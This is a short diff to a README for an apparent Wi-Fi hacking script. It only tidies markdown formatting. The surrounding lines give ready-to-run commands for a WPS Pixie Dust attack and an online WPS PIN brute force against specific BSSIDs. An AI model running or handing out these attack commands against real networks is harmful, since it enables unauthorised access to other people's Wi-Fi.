@@ -43,8 +43,8 @@ sudo python Wifi-Hack/fück-wifi.py -i wlan0 -K
 **First turn off your Wifi.**
 - Show avaliable networks and start Pixie Dust attack on a specified network.
 - `sudo python Wifi-Hack/fück-wifi.py -i wlan0 -K`
-- - Start Pixie Dust attack on a specified BSSID:
+- Start Pixie Dust attack on a specified BSSID:
 `sudo python Wifi-Hack/fück-wifi.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
 - Launch online WPS bruteforce with the specified first half of the PIN:
 - `sudo python Wifi-Hack/fück-wifi.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
-- # Thanks For Using My Tool
+- Thanks For Using My Tool
